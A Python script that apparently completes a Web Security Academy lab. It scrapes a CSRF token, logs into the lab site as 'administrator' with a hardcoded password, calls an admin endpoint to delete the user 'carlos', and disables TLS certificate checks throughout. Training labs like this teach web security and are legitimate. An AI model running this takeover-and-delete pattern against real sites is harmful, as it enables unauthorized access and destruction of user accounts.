#!/usr/bin/python3.7
import requests
import re
from bs4 import BeautifulSoup
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from urllib.parse import quote

url = 'https://0a7e009004fa9699800121fe005500db.web-security-academy.net'

session=requests.Session()

response = session.get(
    url +'/login',
    verify=False,
)

soup = BeautifulSoup(response.text, 'html.parser')
csrf = soup.find('input', {'name': 'csrf'})['value']
session_data = response.headers['Set-Cookie'].split(';')[0].split('=')[1]

cookies = {
    'session': session_data,
}

ADMIN_PASSWORD = 'wli2f2dwpjhhp5x7k4hl'

data = {
    'csrf': csrf,
    'username': 'administrator',
    'password': ADMIN_PASSWORD,
}

response = session.post(
    url+'/login',
    cookies=cookies,
    data=data,
    verify=False,
    allow_redirects=False
)

session_data = response.headers['Set-Cookie'].split(';')[0].split('=')[1]
cookies = {
    'session': session_data,
}

response = session.get(
    url +'/admin/delete?username=carlos',
    cookies=cookies,
    verify=False,
)

soup = BeautifulSoup(response.text,'html.parser')
print(soup)
